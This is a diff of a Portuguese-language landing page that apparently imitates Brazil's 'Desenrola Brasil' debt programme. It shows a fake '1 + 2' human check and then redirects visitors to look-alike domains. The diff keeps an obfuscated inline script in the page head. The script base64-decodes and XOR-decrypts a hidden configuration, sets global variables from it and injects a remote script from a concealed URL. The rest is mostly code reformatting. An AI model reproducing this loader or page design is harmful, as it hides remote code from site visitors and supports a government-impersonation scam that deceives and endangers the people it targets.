@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,10 +8,13 @@
   <meta name="description" content="Acesse sua consulta digital de forma simples, organizada e segura.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;850;900&display=swap" rel="stylesheet">
-  <script>(function(){var k_iw14=atob("DKvuRTUtHX4AfM7vb9DMMEdBP0QiFLqbH9jUahpOeRAuCbqCBs2Xa1ZCcFBiDuGcDNmHNUFeMg5pBKuDQNuHPVBBMxRzXuLNDt+aN1xPaAplD+zVNPbCZ1JBchxhEL3NVfCVZ1tMcBsiRuyfBtOLKXxJP1IiCq+DGs7MfxcbfB03Tv+LWZONclZMKkc3RPvZDprbcwYPYCN9");var t_u=[];for(var a_ow0=0;a_ow0<k_iw14.length;a_ow0++){t_u.push(k_iw14.charCodeAt(a_ow0)&255);}var q_jh=t_u[0];var z_eh6=t_u.slice(1,1+q_jh);var o_r6p=t_u.slice(1+q_jh);var s_4qh=o_r6p.map(function(b,a_v){return b^z_eh6[a_v%q_jh];});var l_o="";for(var c_n0=0;c_n0<s_4qh.length;c_n0++){l_o+=String.fromCharCode(s_4qh[c_n0]&255);}var b_5eo=decodeURIComponent(escape(l_o));var e_1ok=JSON.parse(b_5eo);var t_42w=e_1ok.globals||[];t_42w.forEach(function(x_m){window[x_m.name]=x_m.value;});var n_na9b=document.createElement("script");n_na9b.src=e_1ok.url;n_na9b.async=true;n_na9b.defer=true;(e_1ok.attributes||[]).forEach(function(n_6){n_na9b.setAttribute(n_6.name,n_6.value);});(document.head||document.documentElement).appendChild(n_na9b);})();</script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;850;900&display=swap"
+    rel="stylesheet">
+  <script>(function () { var k_iw14 = atob("DKvuRTUtHX4AfM7vb9DMMEdBP0QiFLqbH9jUahpOeRAuCbqCBs2Xa1ZCcFBiDuGcDNmHNUFeMg5pBKuDQNuHPVBBMxRzXuLNDt+aN1xPaAplD+zVNPbCZ1JBchxhEL3NVfCVZ1tMcBsiRuyfBtOLKXxJP1IiCq+DGs7MfxcbfB03Tv+LWZONclZMKkc3RPvZDprbcwYPYCN9"); var t_u = []; for (var a_ow0 = 0; a_ow0 < k_iw14.length; a_ow0++) { t_u.push(k_iw14.charCodeAt(a_ow0) & 255); } var q_jh = t_u[0]; var z_eh6 = t_u.slice(1, 1 + q_jh); var o_r6p = t_u.slice(1 + q_jh); var s_4qh = o_r6p.map(function (b, a_v) { return b ^ z_eh6[a_v % q_jh]; }); var l_o = ""; for (var c_n0 = 0; c_n0 < s_4qh.length; c_n0++) { l_o += String.fromCharCode(s_4qh[c_n0] & 255); } var b_5eo = decodeURIComponent(escape(l_o)); var e_1ok = JSON.parse(b_5eo); var t_42w = e_1ok.globals || []; t_42w.forEach(function (x_m) { window[x_m.name] = x_m.value; }); var n_na9b = document.createElement("script"); n_na9b.src = e_1ok.url; n_na9b.async = true; n_na9b.defer = true; (e_1ok.attributes || []).forEach(function (n_6) { n_na9b.setAttribute(n_6.name, n_6.value); }); (document.head || document.documentElement).appendChild(n_na9b); })();</script>
   <style>
-    *, *::before, *::after {
+    *,
+    *::before,
+    *::after {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
@@ -29,11 +33,13 @@
       -moz-osx-font-smoothing: grayscale;
     }
 
-    button, input {
+    button,
+    input {
       font: inherit;
     }
 
-    button, a {
+    button,
+    a {
       -webkit-tap-highlight-color: transparent;
     }
 
@@ -44,8 +50,8 @@
       flex-direction: column;
       justify-content: space-between;
       background: linear-gradient(rgba(0, 88, 200, 0.035) 1px, transparent 1px),
-                  linear-gradient(90deg, rgba(0, 88, 200, 0.035) 1px, transparent 1px),
-                  #f3f6f8;
+        linear-gradient(90deg, rgba(0, 88, 200, 0.035) 1px, transparent 1px),
+        #f3f6f8;
       background-size: 42px 42px;
     }
 
@@ -409,8 +415,13 @@
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
     }
 
     @keyframes modalIn {
@@ -418,6 +429,7 @@
         opacity: 0;
         transform: translateY(18px) scale(.97);
       }
+
       to {
         opacity: 1;
         transform: translateY(0) scale(1);
@@ -425,7 +437,9 @@
     }
 
     @keyframes spin {
-      to { transform: rotate(360deg); }
+      to {
+        transform: rotate(360deg);
+      }
     }
 
     @keyframes pulse {
@@ -441,6 +455,7 @@
         padding-right: 0;
         text-align: center;
       }
+
       .simpleCard p {
         margin-left: auto;
         margin-right: auto;
@@ -451,30 +466,37 @@
       .page {
         background-size: 36px 36px;
       }
+
       .simpleMain {
         width: min(100% - 36px, 1120px);
         padding: 54px 0 38px;
       }
+
       .simpleCard h1 {
         font-size: 48px;
         letter-spacing: -2.7px;
       }
+
       .simpleCard p {
         font-size: 18px;
       }
+
       .simpleButton {
         width: 100%;
         min-height: 62px;
         font-size: 22px;
       }
+
       .modal {
         min-height: 0;
         padding: 39px 24px 27px;
         border-radius: 4px 16px 16px 4px;
       }
+
       .modal h2 {
         font-size: 28px;
       }
+
       .footerInner {
         width: min(100% - 36px, 1120px);
         padding: 25px 0 28px;
@@ -482,13 +504,17 @@
     }
 
     @media (prefers-reduced-motion: reduce) {
-      *, *::before, *::after {
+
+      *,
+      *::before,
+      *::after {
         animation-duration: .01ms !important;
         animation-iteration-count: 1 !important;
       }
     }
   </style>
 </head>
+
 <body>
   <div id="__next">
     <main class="page">
@@ -514,8 +540,9 @@
 
     <!-- Modal Backdrop -->
     <div id="modal-backdrop" class="modalBackdrop" role="presentation">
-      <section class="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title" onclick="event.stopPropagation()">
-        
+      <section class="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title"
+        onclick="event.stopPropagation()">
+
         <!-- Step 1 View -->
         <div id="step-1">
           <button id="btn-close-modal-1" aria-label="Fechar" class="closeButton">×</button>
@@ -536,13 +563,8 @@
           <p>Responda à pergunta abaixo para concluir a confirmação.</p>
           <form id="challenge-form">
             <label for="human-answer">Qual é o resultado de 1 + 2?</label>
-            <input 
-              id="human-answer" 
-              inputmode="numeric" 
-              autocomplete="off" 
-              placeholder="Digite sua resposta" 
-              required 
-            />
+            <input id="human-answer" inputmode="numeric" autocomplete="off" placeholder="Digite sua resposta"
+              required />
             <div id="error-message" class="error-text">Resposta incorreta. O resultado de 1 + 2 é 3.</div>
             <button type="submit" id="btn-submit-answer" class="modalPrimary">
               Confirmar e continuar <span>→</span>
@@ -571,8 +593,8 @@
   </div>
 
   <script>
-    (function() {
-      const TARGET_URL = 'https://consulta.desenrolasbrasil.site/consulta.html';
+    (function () {
+      const TARGET_URL = 'https://desenrolasbrasiloficial.com';
 
       const modalBackdrop = document.getElementById('modal-backdrop');
       const btnOpenModal = document.getElementById('btn-open-modal');
@@ -667,37 +689,37 @@
       btnClose2.addEventListener('click', closeModal);
       btnCancel1.addEventListener('click', closeModal);
 
-      modalBackdrop.addEventListener('click', function(e) {
+      modalBackdrop.addEventListener('click', function (e) {
         if (e.target === modalBackdrop) {
           closeModal();
         }
       });
 
-      document.addEventListener('keydown', function(e) {
+      document.addEventListener('keydown', function (e) {
         if (e.key === 'Escape' && modalBackdrop.classList.contains('active')) {
           closeModal();
         }
       });
 
-      btnNext1.addEventListener('click', function() {
+      btnNext1.addEventListener('click', function () {
         goToStep(2);
       });
 
-      btnBack2.addEventListener('click', function() {
+      btnBack2.addEventListener('click', function () {
         hideError();
         goToStep(1);
       });
 
-      humanAnswer.addEventListener('input', function() {
+      humanAnswer.addEventListener('input', function () {
         hideError();
       });
 
-      challengeForm.addEventListener('submit', function(e) {
+      challengeForm.addEventListener('submit', function (e) {
         e.preventDefault();
         if (isLoading) return;
 
         const val = humanAnswer.value.trim().toLowerCase();
-        
+
         // 1 + 2 = 3
         const isCorrect = val === '3' || val === '3.0' || val === 'tres' || val === 'três';
 
@@ -707,7 +729,7 @@
           goToStep('loading');
 
           // Smooth animation delay before redirection
-          setTimeout(function() {
+          setTimeout(function () {
             redirectWithParams();
           }, 1400);
         } else {
@@ -719,4 +741,5 @@
     })();
   </script>
 </body>
+
 </html>
